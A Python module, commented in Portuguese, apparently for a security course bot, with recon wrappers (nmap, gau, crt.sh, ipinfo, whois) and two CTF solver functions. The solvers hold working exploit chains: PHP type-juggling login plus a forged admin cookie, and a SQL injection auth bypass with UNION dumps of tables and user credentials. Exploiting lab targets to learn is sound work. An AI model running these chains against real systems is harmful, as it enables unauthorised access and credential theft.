"""
recon.py — funções de reconhecimento usadas pelo Web XPL Bot.

Cada função valida a entrada, executa a ferramenta/consulta de forma segura
(sem shell=True, com timeout) e devolve texto pronto para o bot enviar.
Erros esperados sobem como ReconError com mensagem amigável.
"""

import base64
import ipaddress
import json
import os
import re
import shutil
import subprocess

import requests

# --- Configuração -----------------------------------------------------------

CMD_TIMEOUT = 120        # segundos para nmap/whois
GAU_TIMEOUT = 180        # gau costuma demorar mais
HTTP_TIMEOUT = 20        # segundos para crt.sh / ipinfo.io
MAX_RESULTS = 100        # limite de linhas para listas grandes (gau/crt)

USER_AGENT = "webxpl-bot/1.0 (+recon educacional)"

# Domínio: rótulos de 1-63 chars, total <= 253, pelo menos um ponto.
_DOMAIN_RE = re.compile(
    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9-]{1,63}(?<!-)(\\.[A-Za-z0-9-]{1,63})+$"
)


class ReconError(Exception):
    """Erro previsível de recon (input inválido, ferramenta ausente, timeout)."""


# --- Validação de entrada ---------------------------------------------------

def is_valid_domain(value: str) -> bool:
    """True se `value` parece um domínio válido (ex.: exemplo.com)."""
    return bool(_DOMAIN_RE.match(value))


def is_valid_ip(value: str) -> bool:
    """True se `value` é um IPv4/IPv6 válido."""
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def is_valid_host(value: str) -> bool:
    """Host aceita domínio OU IP (usado pelo nmap)."""
    return is_valid_domain(value) or is_valid_ip(value)


# --- Execução segura de processos -------------------------------------------

def _run(cmd: list[str], timeout: int = CMD_TIMEOUT) -> str:
    """
    Executa `cmd` (lista de args, nunca string) com timeout e captura de saída.

    Args:
        cmd: comando e argumentos, ex.: ["nmap", "-F", host].
        timeout: tempo máximo em segundos.

    Returns:
        Saída padrão (ou stderr, se stdout vier vazio).

    Raises:
        ReconError: ferramenta ausente, timeout ou saída vazia.
    """
    if shutil.which(cmd[0]) is None:
        raise ReconError(f"Ferramenta '{cmd[0]}' não encontrada no PATH.")
    try:
        proc = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
            check=False,
        )
    except subprocess.TimeoutExpired:
        raise ReconError(f"Tempo esgotado ({timeout}s) ao executar '{cmd[0]}'.")

    saida = proc.stdout.strip() or proc.stderr.strip()
    if not saida:
        raise ReconError("A ferramenta não retornou nenhuma saída.")
    return saida


def _gau_bin() -> str:
    """Resolve o binário do gau (env GAU_PATH, PATH, ou ~/go/bin/gau)."""
    cand = os.getenv("GAU_PATH", "gau")
    if shutil.which(cand):
        return cand
    fallback = os.path.expanduser("~/go/bin/gau")
    if os.path.exists(fallback):
        return fallback
    return cand  # deixa _run reportar a ausência com mensagem clara


# --- Comandos ---------------------------------------------------------------

def run_nmap(host: str) -> str:
    """Scan rápido de portas/serviços (top 100 portas) em `host`."""
    if not is_valid_host(host):
        raise ReconError("Host inválido. Informe um domínio ou IP.")
    # -F: fast scan (top 100 portas) | -T4: mais rápido | -Pn: não depende de ping
    return _run(["nmap", "-F", "-T4", "-Pn", host])


def run_gau(domain: str) -> str:
    """Coleta passiva de URLs conhecidas do `domain` via gau (GetAllURLs)."""
    if not is_valid_domain(domain):
        raise ReconError("Domínio inválido. Ex.: exemplo.com")
    saida = _run([_gau_bin(), domain], timeout=GAU_TIMEOUT)
    urls = sorted(set(saida.splitlines()))
    total = len(urls)
    if total > MAX_RESULTS:
        corpo = "\n".join(urls[:MAX_RESULTS])
        return f"{corpo}\n\n... (+{total - MAX_RESULTS} URLs — total {total})"
    return "\n".join(urls)


def run_crt(domain: str) -> str:
    """Lista subdomínios de `domain` a partir de certificados no crt.sh."""
    if not is_valid_domain(domain):
        raise ReconError("Domínio inválido. Ex.: exemplo.com")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        resp = requests.get(url, timeout=HTTP_TIMEOUT, headers={"User-Agent": USER_AGENT})
        resp.raise_for_status()
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao consultar o crt.sh: {exc}")

    try:
        registros = resp.json()
    except json.JSONDecodeError:
        raise ReconError("crt.sh não retornou JSON válido (tente de novo em instantes).")

    # name_value pode conter vários nomes separados por \n
    subdominios = sorted({
        nome.strip()
        for reg in registros
        for nome in reg.get("name_value", "").splitlines()
        if nome.strip()
    })
    if not subdominios:
        raise ReconError("Nenhum subdomínio encontrado no crt.sh.")

    total = len(subdominios)
    if total > MAX_RESULTS:
        corpo = "\n".join(subdominios[:MAX_RESULTS])
        return f"{corpo}\n\n... (+{total - MAX_RESULTS} subdomínios — total {total})"
    return "\n".join(subdominios)


def run_ipinfo(ip: str) -> str:
    """Geolocalização/ASN/organização do `ip` via ipinfo.io."""
    if not is_valid_ip(ip):
        raise ReconError("IP inválido. Ex.: 8.8.8.8")
    try:
        resp = requests.get(
            f"https://ipinfo.io/{ip}/json",
            timeout=HTTP_TIMEOUT,
            headers={"User-Agent": USER_AGENT},
        )
        resp.raise_for_status()
        dados = resp.json()
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao consultar o ipinfo.io: {exc}")
    except json.JSONDecodeError:
        raise ReconError("ipinfo.io não retornou JSON válido.")

    campos = ["ip", "hostname", "city", "region", "country", "loc", "org", "postal", "timezone"]
    linhas = [f"{c:<10}: {dados[c]}" for c in campos if c in dados]
    return "\n".join(linhas) if linhas else "Sem dados para este IP."


def run_whois(domain: str) -> str:
    """(Bônus) Consulta WHOIS de `domain` — registrante, datas, nameservers."""
    if not is_valid_domain(domain):
        raise ReconError("Domínio inválido. Ex.: exemplo.com")
    saida = _run(["whois", domain], timeout=60)
    # WHOIS é verboso: mantém só linhas úteis (chave: valor), corta comentários.
    uteis = [
        ln for ln in saida.splitlines()
        if ":" in ln and not ln.strip().startswith(("%", "#", ">>>"))
    ]
    return "\n".join(uteis[:MAX_RESULTS]) if uteis else saida


# Alvo do desafio FIAP WEB XPL (lab autorizado do curso). Configurável via env.
WEBXPL_URL = os.getenv("WEBXPL_URL", "http://fiap.zapto.org:8001")


def solve_webxpl() -> str:
    """
    (Bônus CTF) Resolve automaticamente o desafio FIAP WEB XPL.

    Cadeia de exploração:
      1. PHP type juggling no login.php  -> envia {"pass": true} (true == "senha" no ==).
      2. Modifica o objeto serializado do cookie 'nookie' (Base64+JSON), forjando
         usuario=fiapwner e permissao=ctfcup-admin.
      3. Acessa user.php com o cookie forjado e extrai a flag.

    Returns:
        Relatório passo a passo com a flag capturada.

    Raises:
        ReconError: falha de rede ou flag não encontrada.
    """
    base = WEBXPL_URL.rstrip("/")
    sess = requests.Session()
    sess.headers.update({"User-Agent": USER_AGENT})
    passos = []

    # 1) Type juggling: pass como boolean
    try:
        r1 = sess.post(f"{base}/login.php", json={"pass": True}, timeout=HTTP_TIMEOUT)
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao acessar o alvo ({base}): {exc}")
    ok_login = "bem-vindo" in r1.text.lower()
    passos.append(
        "[1] Type juggling em login.php  ->  body {\"pass\": true}\n"
        f"    Login {'ACEITO (true == senha)' if ok_login else 'NAO aceito'}."
    )

    # 2) Forjar o objeto serializado do cookie
    obj = {"usuario": "fiapwner", "permissao": "ctfcup-admin"}
    forjado = base64.b64encode(json.dumps(obj).encode()).decode()
    passos.append(
        "[2] Cookie forjado (Modifying serialized object):\n"
        f"    {json.dumps(obj)}\n"
        f"    nookie={forjado}"
    )

    # 3) Acessar user.php com o cookie forjado
    try:
        r2 = sess.get(
            f"{base}/user.php",
            headers={"Cookie": f"nookie={forjado}"},
            timeout=HTTP_TIMEOUT,
        )
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao acessar user.php: {exc}")

    match = re.search(r"FIAP\\{[^}]+\\}", r2.text)
    if not match:
        raise ReconError("Flag não encontrada (o alvo pode estar fora do ar ou alterado).")

    passos.append("[3] GET user.php com cookie forjado  ->  ACESSO AUTORIZADO")
    passos.append(f"\n🚩 FLAG: {match.group(0)}")
    return "\n".join(passos)


# Alvo do comando /sqli: vAPI local (a mesma da Parte 1 do trabalho).
# O endpoint POST /vapi/api8/user/login concatena o body direto em whereRaw()
# — SQL Injection clássico (OWASP Top 10 A03:2021 - Injection).
SQLI_URL = os.getenv("SQLI_URL", "http://localhost:8000/vapi/api8/user/login")


def _sqli_login(sess: requests.Session, username: str) -> dict:
    """POST no endpoint vulnerável e devolve o JSON de resposta."""
    r = sess.post(
        SQLI_URL,
        json={"username": username, "password": "x"},
        timeout=HTTP_TIMEOUT,
    )
    try:
        return r.json()
    except json.JSONDecodeError:
        return {}


def solve_sqli() -> str:
    """
    (Bônus CTF) Explora SQL Injection na vAPI (POST /vapi/api8/user/login).

    Cadeia de exploração:
      1. Auth bypass com  ' OR 1=1-- -   (retorna o authkey de um usuário real).
      2. UNION-based dump: o SELECT original tem 2 colunas (username, authkey) e o
         handler retorna apenas o `authkey`, então a exfiltração vai na 2ª coluna:
         version(), database(), current_user() e as tabelas via information_schema.

    Returns:
        Relatório passo a passo com os dados exfiltrados.

    Raises:
        ReconError: alvo inacessível ou injeção não detectada.
    """
    sess = requests.Session()
    sess.headers.update({"User-Agent": USER_AGENT})

    # 0) ping — o endpoint deve responder success=false para usuário inexistente
    try:
        base_resp = _sqli_login(sess, "usuario_inexistente_probe")
    except requests.RequestException as exc:
        raise ReconError(f"Falha ao acessar o alvo ({SQLI_URL}): {exc}")

    if base_resp.get("success") != "false":
        raise ReconError("Resposta inesperada do alvo (endpoint mudou?).")

    # 1) Auth bypass clássico
    bypass_payload = "' OR 1=1-- -"
    bypass = _sqli_login(sess, bypass_payload)
    if bypass.get("success") != "true" or not bypass.get("authkey"):
        raise ReconError("Auth bypass falhou (endpoint pode ter sido corrigido).")
    authkey_leak = bypass["authkey"]

    # 2) Dump via UNION: a 2ª coluna do UNION aparece no campo "authkey" da resposta.
    def dump(expr: str) -> str:
        payload = f"' UNION SELECT NULL,({expr})-- -"
        resp = _sqli_login(sess, payload)
        return str(resp.get("authkey", "(vazio)"))

    versao = dump("version()")
    dbname = dump("database()")
    usuario = dump("current_user()")
    tabelas = dump("SELECT GROUP_CONCAT(table_name SEPARATOR ',') "
                   "FROM information_schema.tables WHERE table_schema=database()")
    users_dump = dump("SELECT GROUP_CONCAT(username,':',password SEPARATOR ' | ') "
                      "FROM a_p_i8_users")

    return "\n".join([
        f"Alvo: POST {SQLI_URL}   (vAPI local — OWASP Top 10 A03:2021 Injection)",
        "",
        f"[1] Auth bypass  payload: username=  {bypass_payload}",
        f"    -> authkey vazado: {authkey_leak}",
        "",
        "[2] UNION-based data dump (2 colunas: NULL, <exfil>)",
        f"    Versao do banco    : {versao}",
        f"    Database atual     : {dbname}",
        f"    Usuario do banco   : {usuario}",
        f"    Tabelas do database: {tabelas}",
        f"    Credenciais (a_p_i8_users): {users_dump}",
        "",
        "Vulnerabilidade: SQL Injection (concatenacao em whereRaw).",
        "Correcao: prepared statements / parameter binding (ex.: ->where('username',$u))",
    ])
